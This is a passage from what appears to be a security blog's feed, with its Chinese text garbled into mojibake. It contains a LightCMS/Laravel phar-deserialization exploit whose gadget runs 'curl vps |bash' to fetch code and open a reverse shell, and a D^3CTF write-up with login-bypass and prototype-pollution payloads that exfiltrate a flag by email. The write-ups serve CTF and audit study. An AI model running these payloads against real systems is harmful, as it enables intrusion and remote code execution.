<code>file_get_contents</code>æ¥è·å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä¿å­˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨fileåè®®å®ç°ä»»æ„æ–‡ä»¶è¯»å–ç­‰ssrfæ“ä½œã€‚æ›´å±é™©çš„æ˜¯è¿™é‡Œçš„é€»è¾‘æ˜¯å–åˆ°çš„æ–‡ä»¶ååç¼€æ˜¯ä»€ä¹ˆï¼Œä¿å­˜çš„å°±æ˜¯ä»€ä¹ˆåç¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ”¾ä¸€ä¸ªphpä¸€å¥è¯åœ¨æœåŠ¡å™¨ä¸Šï¼Œç„¶åæ¥è¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥getshellã€‚</p><p>å…·ä½“å¯è§<a href="https://github.com/eddy8/LightCMS/issues/19">https://github.com/eddy8/LightCMS/issues/19</a>ã€‚</p><h2 id="v1-3-7-RCEæ¼æ´"><a href="#v1-3-7-RCEæ¼æ´" class="headerlink" title="v1.3.7 RCEæ¼æ´"></a>v1.3.7 RCEæ¼æ´</h2><p>æäº†ä¸ªissueåï¼Œä½œè€…ä¹Ÿæ˜¯åŠæ—¶è¿›è¡Œäº†ä¿®å¤ï¼Œåˆ†æä¸‹patchçš„æ“ä½œï¼Œå¢åŠ äº†ä¸€ä¸ª fetchImageFile å‡½æ•°å¤„ç†ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510002401236.png" alt="image-20210510002401236"></p><p>è·Ÿè¿›åˆ†æ fetchImageFileï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510002453997.png" alt="image-20210510002453997"></p><p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†curlæ¥è·å–è¿œç¨‹èµ„æºçš„å†…å®¹ï¼Œç„¶åä½¿ç”¨ Image:make æ¨¡å—è¿›è¡Œè§£æã€‚å¹¶ä¸”å¯¹åç¼€ä¹Ÿè¿›è¡Œäº†ä¸¥æ ¼çš„è¿‡æ»¤ã€‚åŒæ—¶è¿™ä¸ª cms å¤§å¤šéƒ½æ˜¯æ•°æ®åº“æ“ä½œï¼Œæ¶‰åŠæ–‡ä»¶æ“ä½œå°‘ä¹‹åˆå°‘ï¼Œçœ‹èµ·æ¥æ˜¯æ— æ³•ç›´æ¥RCEçš„ã€‚</p><p>laravel æ¡†æ¶å¼€å‘æˆ‘è‡ªç„¶è”æƒ³åˆ°äº†ååºåˆ—åŒ–ï¼Œå¹¶ä¸”è¿™ä¸ªcms åå°è¿˜æ˜¯æœ‰å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½çš„ï¼Œèƒ½ä¸èƒ½åˆ©ç”¨ phar ååºåˆ—åŒ–å®ç° RCE å‘¢ï¼Ÿ</p><h3 id="POPé“¾"><a href="#POPé“¾" class="headerlink" title="POPé“¾"></a>POPé“¾</h3><p>æ­£å¼ç‰ˆæœ¬Laravel ç‰ˆæœ¬æ˜¯ 6.20.16ï¼Œæµ‹è¯•å‘ç° 5.8 ç‰ˆæœ¬åˆ©ç”¨ <code>dispatch</code>æ–¹æ³•çš„RCEé“¾åœ¨6.20.16ç‰ˆæœ¬å¯ä»¥ä½¿ç”¨ã€‚ç»è¿‡æµ‹è¯• 7.x ç‰ˆæœ¬ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™æ¡é“¾ã€‚<a href="https://www.anquanke.com/post/id/231079">è¿™ç¯‡æ–‡ç« </a>åˆ†æåˆ°äº†laravel 8 çš„é“¾å­ï¼Œä¸è¿‡å¤šèµ˜è¿°äº†ã€‚</p><h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><p>æœ‰äº† RCE é“¾ï¼Œæˆ‘ä»¬éœ€è¦å°† phar æ–‡ä»¶ä¼ ä¸Šå»ã€‚patch è¿‡çš„è¿œç¨‹ä¸‹è½½å›¾ç‰‡åŠŸèƒ½ï¼Œä½¿ç”¨äº†<code>Intervention\Image\Facades\Image</code>åº“æ¥è¿›è¡Œå›¾ç‰‡è§£æï¼Œå¯¹æ–‡ä»¶å†…å®¹æ£€æŸ¥è¾ƒä¸ºä¸¥æ ¼ï¼Œä½†æ˜¯æœ¬åœ°å›¾ç‰‡ä¸Šä¼ å¤„è¾ƒä¸ºæ¾æ•£ï¼Œä½¿ç”¨ä¸€èˆ¬çš„æ·»åŠ  GIF æ–‡ä»¶å¤´çš„æ–¹æ³•å°±å¯ä»¥æˆåŠŸä¸Šä¼ ã€‚</p><h3 id="è§¦å‘ç‚¹"><a href="#è§¦å‘ç‚¹" class="headerlink" title="è§¦å‘ç‚¹"></a>è§¦å‘ç‚¹</h3><p>æœ€åä¸€æ­¥ä¹Ÿå°±æ˜¯ç›¸å¯¹å›°éš¾çš„ä¸€æ­¥ï¼Œéœ€è¦æ‰¾åˆ°è§¦å‘pharçš„ç‚¹ï¼Œå³æˆ‘ä»¬å¯æ§çš„ä¸€ä¸ªæ–‡ä»¶å¤„ç†å‡½æ•°ã€‚å…¶å®å‰é¢æåˆ°äº†è¿™ä¸ªcmså¹¶æ²¡æœ‰å¤ªå¤šæ–‡ä»¶æ“ä½œã€‚</p><p>æ³¨æ„åˆ°ä¿®å¤ä»£ç  <code>fetchImageFile</code>å‡½æ•°å­˜åœ¨å¦‚ä¸‹æ“ä½œï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003422513.png" alt="image-20210510003422513"></p><p>åœ¨è·å–åˆ°è¿œç¨‹urlçš„å†…å®¹åï¼Œä¼šè°ƒç”¨ <code>Intervention\Image\Facades\Image</code>çš„ <code>make</code>æ–¹æ³•ï¼Œå¯¹å›¾ç‰‡å†…å®¹è¿›è¡Œè§£æã€‚</p><p>çœ‹åˆ°è¿™é‡Œæˆ‘éšçº¦æƒ³èµ·ä¹‹å‰è§è¿‡ <code>Image:make($url)</code>è¿™ç§ç”¨æ³•ï¼Œé‚£ä¹ˆè¿™é‡Œçš„ url èƒ½ä¸èƒ½æœ‰ç±»ä¼¼ file_get_content ä¹‹ç±»çš„æ–‡ä»¶æ“ä½œå‘¢ï¼Ÿ</p><p>è·Ÿè¿›ï¼Œä¼šè·³åˆ° <code>vendor/intervention/image/src/Intervention/Image/AbstractDecoder.php</code>ä¸­ <code>AbstractDecoder</code>ç±»çš„ <code>init</code>æ–¹æ³•ï¼Œåˆ¤æ–­æ•°æ®ç±»å‹ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003643456.png" alt="image-20210510003643456"></p><p>å¯ä»¥çœ‹åˆ° data ä¸ä»…å¯ä»¥æ˜¯å›¾ç‰‡çš„äºŒè¿›åˆ¶æ•°æ® ï¼Œè¿˜å¯ä»¥æ˜¯è¿™äº›æ•°æ®æ ¼å¼ï¼Œè·Ÿè¿› <code>initFromUrl</code>æ–¹æ³•ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003659411.png" alt="image-20210510003659411"></p><p>éå¸¸æ˜æ˜¾çš„ file_get_contentsï¼Œé‚£ä¹ˆæœ€åè§¦å‘ç‚¹çš„é—®é¢˜ä¹Ÿè§£å†³äº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ vps ä¸Šæ”¾ç½®ä¸€ä¸ª txt æ–‡ä»¶ï¼Œå†…å®¹ä¸º <code>phar://./upload/xxx</code>ï¼Œç„¶åè®©æœåŠ¡å™¨æ¥å–è¿™ä¸ªæ–‡ä»¶ï¼Œå³å¯è§¦å‘ååºåˆ—åŒ–ã€‚</p><h3 id="RCEæµç¨‹"><a href="#RCEæµç¨‹" class="headerlink" title="RCEæµç¨‹"></a>RCEæµç¨‹</h3><p>é¦–å…ˆç”Ÿæˆ phar æ–‡ä»¶:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$events, $event</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">      <span class="keyword">protected</span> $connection;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$connection</span>)</span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$queueResolver</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $command = new Illuminate\Broadcasting\BroadcastEvent(&#x27;curl vps |bash&#x27;);</span><br><span class="line"></span><br><span class="line">    $dispater = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"></span><br><span class="line">    $PendingBroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($dispater,$command);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    $phar -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    $phar -&gt; setMetadata($PendingBroadcast);</span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨åå°æ·»åŠ æ–‡ç« å¤„ä¸Šä¼ å›¾ç‰‡ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003829527.png" alt="image-20210510003829527"></p><p>å¾—åˆ°æ–‡ä»¶è·¯å¾„ <code>upload/image/202102/AciwTtmKQ7IQN4gdeoiZ6ve4A0LSK48SGJGk38df.gif</code>ã€‚</p><p>åœ¨ vps ä¸Šæ”¾ç½®ä¸€ä¸ªæ–‡ä»¶ï¼Œå†…å®¹ä¸º <code>phar://./upload/image/202102/AciwTtmKQ7IQN4gdeoiZ6ve4A0LSK48SGJGk38df.gif</code>ï¼Œè®©æœåŠ¡å™¨æ¥å–è¿™ä¸ªæ–‡ä»¶ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003921345.png" alt="image-20210510003921345"></p><p>å¯ä»¥åå¼¹shellï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510003934994.png" alt="image-20210510003934994"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªæ¼æ´è™½ç„¶åˆ©ç”¨èµ·æ¥å¹¶ä¸ç®—å¤æ‚ï¼Œä½†æ˜¯ phar è§¦å‘ç‚¹ç›¸å¯¹éšç§˜ä¸€äº›ï¼Œä¸å®¹æ˜“è¢«å‘ç°ï¼Œè¿™ä¸ªæ“ä½œä¹Ÿæ˜¯ä¹‹å‰æ²¡æœ‰è§è¿‡çš„ï¼ˆæ„Ÿè§‰å¾ˆé€‚åˆCTF 2333ï¼‰ï¼Œè¿˜æ˜¯æŒºæœ‰è¶£çš„ï¼Œåªå¯æƒœæ„Ÿè§‰æ‰“çš„äººä¸å¤ªå¤šã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ä¹‹å‰ä¸ºäº†ç†Ÿæ‚‰ä¸‹ laravelï¼Œæ‰¾äº†ä¸ªåŸºäº laravel å¼€å‘çš„ cms å®¡è®¡ç»ƒç»ƒæ‰‹ï¼Œç„å‡†äº† lightcmsã€‚&lt;/p&gt;
&lt;p&gt;å…ˆæ˜¯æŒ–åˆ°äº†ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„ä»»æ„æ–‡ä»¶è¯»å–&amp;amp;RCEæ¼æ´ï¼Œæäº†issueè¢«ä¿®å¤ååˆç®€å•å®¡è®¡äº†ä¸€æ³¢ï¼ŒæŒ–æ˜åˆ°äº†ä¸€ä¸ªæœ‰æ„æ€çš„RCEï¼Œæ„Ÿè§‰å¾ˆé€‚åˆ CTFï¼Œå°±æ‹¿æ¥å‡ºé¢˜äº†ï¼Œè¢«ç”¨åšäº†ä»Šå¹´çº¢å¸½æ¯çš„åˆèµ›ã€‚å¾ˆé—æ†¾ç”±äºæ”¾å‡ºé¢˜ç›®æ—¶é—´è¾ƒæ™š+å¾ˆå¤šdalaoå»æ‰“æ´¥é—¨æ¯äº†ï¼Œè¿™é“é¢˜åªæœ‰ä¸¤ä¸ªé˜Ÿä¼è§£å‡ºã€‚&lt;/p&gt;
&lt;p&gt;é¢˜ç›®ç¯å¢ƒé“¾æ¥ï¼š&lt;a href=&quot;https://github.com/gml-sec/My-CTF-Challenges/tree/main/2021-Redhat-ezlight&quot;&gt;https://github.com/gml-sec/My-CTF-Challenges/tree/main/2021-Redhat-ezlight&lt;/a&gt;ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://igml.top/categories/PHP/"/>
    
    <category term="Web" scheme="https://igml.top/categories/PHP/Web/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="https://igml.top/categories/PHP/Web/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="PHP" scheme="https://igml.top/tags/PHP/"/>
    
    <category term="laravel" scheme="https://igml.top/tags/laravel/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="https://igml.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2021 D^3CTF Web éƒ¨åˆ†wp</title>
    <link href="https://igml.top/2021/03/08/2021-D3CTF/"/>
    <id>https://igml.top/2021/03/08/2021-D3CTF/</id>
    <published>2021-03-08T08:43:36.000Z</published>
    <updated>2021-03-08T11:48:58.103Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«ä¸¤å¤©å‡ ä¹éƒ½åœ¨è‚D^3CTFï¼Œæœ¬æ¥é˜Ÿé‡Œæ‰“çš„äººå°±ä¸å¤šï¼Œé¢˜è´¨é‡è¿˜å¾ˆé«˜è€Œä¸”é¢˜é‡ä¹Ÿä¸å°‘ï¼Œæ‰€ä»¥æ‰“çš„éå¸¸ç´¯ã€‚ Web åŸºæœ¬ä¸€äººå•æï¼Œåæ¥æŠŠé˜Ÿé‡Œé€†å‘ï¼ˆå…¨æ ˆï¼‰å¤§ä½¬æ‹‰æ¥ä¸€èµ·æ shellgenï¼Œæµªè´¹äº†ä¸å°‘æ—¶é—´ã€‚</p><p>æœ€åæˆç»©æ˜¯ç¬¬å››åï¼ˆæœç„¶æ˜¯ Redbud-Misc é˜Ÿï¼ŒAK Miscï¼‰ï¼Œè„‘ç‹yydsï¼Œè¿™é‡Œè®°å½•ä¸‹ä¸‰é“Webçš„wpã€‚</p><a id="more"></a><img src="/2021/03/08/2021-D3CTF/image-20210308190727832.png" alt="image-20210308190727832" style="zoom:50%;"><h2 id="8-bit-pub"><a href="#8-bit-pub" class="headerlink" title="8-bit pub"></a>8-bit pub</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å…ˆè¦ç™»é™†adminã€‚</p><p>ä¼ å…¥çš„usernameå’Œpasswordå¦‚æœç”¨jsonæäº¤ï¼Œå¯ä»¥ä¼ å…¥dictã€‚å¦‚æœpasswordæ˜¯ä¸ªdictï¼Œä¼šæŠŠkeyåå­—ä½œä¸ºåˆ—æŸ¥è¯¢ï¼Œæ„é€ Payload: </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="attr">&quot;password&quot;</span>:&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>å³å¯ç™»é™†adminã€‚</p><p>è¿›å…¥adminï¼Œå¯ä»¥å‘é‚®ä»¶çš„åŠŸèƒ½ï¼Œä½¿ç”¨äº† nodemailerã€‚å‰é¢ä½¿ç”¨äº†shvl æ¥è¿›è¡Œèµ‹å€¼ï¼ŒçŒœæµ‹æœ‰åŸå‹é“¾æ±¡æŸ“ã€‚æŸ¥çœ‹ç‰ˆæœ¬ï¼Œå‘ç° shvl æ˜¯ 2.0.2 çš„ç‰ˆæœ¬ï¼ŒåŸå‹é“¾æ±¡æŸ“è¢«ä¿®å¤ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/JNoBlTqeMr3JZA1oWU54M_ZWo7CrJ01GspHHPdgkoBit9Jd1RIl30S0BhFNLpxYKa0hWyhFGkCaQZfFqyqUrYTXuNbaRUZaiyD5SviOf6b1C4oXQBB6V7Gev5wXD7Yb7rY0L4jqO.png" alt="img"></p><p>ä½†æ˜¯ä»…ä»…è¿‡æ»¤äº†å…³é”®å­—__proto__ï¼Œå¯ä»¥ä½¿ç”¨ prototype ç»•è¿‡ã€‚</p><p>åŸå§‹çš„åˆ©ç”¨ï¼š</p><img src="/2021/03/08/2021-D3CTF/mPACSo-7KERY1x58_2hFnEDuja_G_jbRZgeGU7p5yQilELEqAMww0lggbZimkRLhhmUH4g-bsrMWeH0lmqWd1SsWdH12nk5EsZhNWf6_iTNpNV8EXBROgKtzAtSpLKJx-xDqbfmI.png" alt="img" style="zoom:50%;"><p>å¯ä»¥ä½¿ç”¨prototypeç»•è¿‡ï¼Œpayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.constructor.prototype.path</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥éœ€è¦åœ¨ nodemailer é‡Œæ‰¾rceçš„ç‚¹ï¼Œæœå…³é”®å­—å‘ç°äº†å­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„ç‚¹ï¼š</p><img src="/2021/03/08/2021-D3CTF/w32rGyw-n0Nmg7NWPZ9rc4HHJvqoGbbhZ3Bx8maQxKm8slrulLKGXD-9DWHISq8CINqN58Gv_aURe84W5m6nZdOyYCP0ETMWAYIpwP5P0mcqAjLZTSb_lYkx5RJKjhx11R5_5WSB.png" alt="img" style="zoom:50%;"><p>å­˜åœ¨è°ƒç”¨ï¼š</p><img src="/2021/03/08/2021-D3CTF/6wUGhVotlC5QKgc-kbVWXiSXBRYgXNGAC7GqDhP2MC45tiYKA3A6r7c7cahi_uXmV5sLRc9MKyPZrjeCjeSfe4sZ_gOFyJ5IPIZoakVWrOHMh0hnmWupUtJZcdrimsHvpQYmrVG2.png" alt="img" style="zoom:50%;"><p>åŸæœ¬æ˜¯æ‰§è¡Œsendmailçš„ï¼Œå¯ä»¥è€ƒè™‘æ±¡æŸ“ this.pathï¼Œå°±å¯ä»¥rceäº†ã€‚è¿½è¸ªæºç ï¼Œå¯»æ‰¾ this.path çš„èµ‹å€¼ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/EKV5IETE1fYX1XFBlQyoNuFoT3H-Ull4syXvhRw60lxJI2LtlLwq8jjBOcjhx6Lpg_nwsrAJZtS_w-iZZkY4cY7yuSK8w9tubMJYUuy_RJbzCXPEHoiihk9r7JyroiWBDe-d_HQ0.png" alt="img"></p><p>Options.path èµ‹å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å‘ Object é‡Œæ±¡æŸ“ä¸€ä¸ªpathï¼Œå°±å¯ä»¥äº†ã€‚</p><p>ä½†æ˜¯è¦ä½¿ç”¨ sendmailï¼Œåœ¨nodemailer/lib/nodemailer.jsè¿˜æœ‰ä¸€å¤„ifåˆ¤æ–­ï¼š</p><img src="/2021/03/08/2021-D3CTF/wEH2DVHzBS7_dLhM5JeJokDRaQ07wmttykDGHYDTjfxTd8uTrIXGmNIQgTrxJ_hsYMGUoZrHoFfhTtkJ7zhnPOClPyUWM4Z6djK52EgDqbqKg2VEY9WzFg5GPb8P4dw-tVy5yUxe.png" alt="img" style="zoom:50%;"><p>æ‰€ä»¥è¿˜è¦æ±¡æŸ“ä¸€ä¸ªpoolä¸º0ï¼Œæ±¡æŸ“ä¸€ä¸ªsendmailä¸º1ã€‚</p><p>æœ€å spawn æ‰§è¡Œå‘½ä»¤ï¼Œä¸æ”¯æŒç®¡é“ç¬¦ä¹‹ç±»çš„ï¼Œæ‰€ä»¥ /readflag &gt; /tmp/gml è¿™ç§æ— æ³•ç›´æ¥æ‰§è¡Œã€‚</p><p>æ³¨æ„åˆ°æœ‰argsï¼Œå¯ä»¥ä¸ºå‘½ä»¤é™„å¸¦å‚æ•°ã€‚çœ‹çœ‹è¿™ä¸ªargsæ€ä¹ˆèµ‹å€¼çš„ï¼š</p><img src="/2021/03/08/2021-D3CTF/p-xOu8p_m0U7fj2F8F0ccBoj5nL2ZsD71bKQzWY2zYANynVRwP5Noie7m8PS8lQW5cZVLfeGkuHkaZc8OnIpoKro1em10kdzcH49H4Xx8gQOqvghyLcjmlma-emOhnYnq2eugIJF.png" alt="img" style="zoom: 50%;"><p>ä¹Ÿå¯ä»¥è¿›è¡Œæ±¡æŸ“ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œå‰ï¼ŒåŠ äº†ä¸ª -i å‚æ•°ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/zP-1m-vQp7DdOdNOK8HytgVbaB7efTFC8k8ITjZ7Y-xdnMwCBeB2mqmhVX_Mgm19PPSYUIbsULS239jCt25DSlBG5LoKwMaD4x061o6imHCKNT_fBCFxSWadKtAeQ6lLB4Aw-EJa.png" alt="img"></p><p>å°è¯• curl -iï¼Œwget -i ä¹‹ç±»çš„ï¼Œä½†æ˜¯æ— æ³•æŠŠå‘½ä»¤æ‰§è¡Œçš„ç»“æœå¸¦å‡ºã€‚</p><p>æœ€åæµ‹è¯•å¯ä»¥ bash -i -c è¿™æ ·ï¼š</p><p><code>spawn(&#39;bash&#39;,[&#39;-i&#39;,&#39;-c&#39;,&#39;ls &gt; /tmp/gml&#39;]);</code></p><p>æœ¬åœ°æµ‹è¯•æˆåŠŸæ‰§è¡Œã€‚ç„¶åå‘é‚®ä»¶åŠŸèƒ½æˆ‘ä»¬å¯ä»¥æŒ‡å®šé™„ä»¶ï¼ŒæŠŠ /tmp/gml é€šè¿‡é‚®ä»¶ç»™å‘è¿‡æ¥ã€‚</p><h3 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h3><p>é¦–å…ˆåŸå‹é“¾æ±¡æŸ“ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œpayloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;subject&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;text&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;a.constructor.prototype.path&quot;</span>:<span class="string">&quot;sh&quot;</span>,<span class="attr">&quot;a.constructor.prototype.pool&quot;</span>:<span class="number">0</span>,<span class="attr">&quot;a.constructor.prototype.sendmail&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;a.constructor.prototype.args&quot;</span>:[<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;/readflag&gt;/tmp/gml&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p>æŠŠflagå†™è¿›/tmp/flagã€‚å†é€šè¿‡å‘é‚®ä»¶é™„ä»¶çš„å½¢å¼ï¼ŒæŠŠflagç»™æˆ‘å‘è¿‡æ¥ã€‚ç¿»é˜…æ–‡æ¡£å‘é€é™„ä»¶çš„æ–¹æ³•ï¼Œpayloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;to&quot;</span>:<span class="string">&quot;xxx@qq.com&quot;</span>,<span class="attr">&quot;subject&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;text&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="attr">&quot;attachments&quot;</span>:[&#123;<span class="attr">&quot;filename&quot;</span>:<span class="string">&quot;gml.txt&quot;</span>,<span class="attr">&quot;path&quot;</span>:<span class="string">&quot;/tmp/gml&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/03/08/2021-D3CTF/5aiWUmG8S1x0uEsU1N-VSaQOwiXtTwL6_lzQIc4YAJWEKH-55wo9pZECJfk4hkUkc5NvCWRofRTI3ck-sJX2vPSvjpuVFh-YzknIe8izOhaGqOJ0KHxNtkj1YMZkpV3cim5j170D.png" alt="img"></p><h2 id="Real-cloud-storage"><a href="#Real-cloud-storage" class="headerlink" title="Real_cloud_storage"></a>Real_cloud_storage</h2><p>ä¸Šä¼ æ–‡ä»¶ï¼Œå¾€fn10085032.serverless.cloud.d3ctf.ioå‘åŒ…ï¼Œå¯ä»¥æŒ‡å®šendpoint ä¸backetã€‚</p><p>æµ‹è¯•å‘ç°å¯ä»¥æŒ‡å®šæˆä»»æ„åŸŸã€‚è®¾ç½®æŒ‡å®šæˆè‡ªå·±çš„æœåŠ¡å™¨ï¼Œè§‚å¯Ÿå‘æ¥çš„ä¸Šä¼ åŒ…ï¼š</p><p><img src="/2021/03/08/2021-D3CTF/image-20210308173200850.png" alt="image-20210308173200850"></p><p>Google ä¸€ä¸‹ nos-sdk-javaï¼Œå‘ç°æºç ï¼š<a href="https://github.com/NetEase-Object-Storage/nos-java-sdk">https://github.com/NetEase-Object-Storage/nos-java-sdk</a></p><p>æºç å®¡è®¡ï¼Œå› ä¸ºæˆ‘ä»¬åªæœ‰ä¸€ä¸ªuploadåŠŸèƒ½ï¼Œåªæœ‰é‚£å‡ ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å…³æ³¨uploadåŠŸèƒ½çš„ç›¸å…³æºç ï¼Œä½†æ²¡å•¥åˆ©ç”¨çš„ã€‚</p><p>å°è¯•æ¨¡ä»¿è¿™ä¸ªåŒ…ï¼Œæˆ‘ä»¬è‡ªå·±æ„é€ å‘ oss ä¸Šä¼ æ–‡ä»¶çš„åŒ…ï¼š</p><p><img 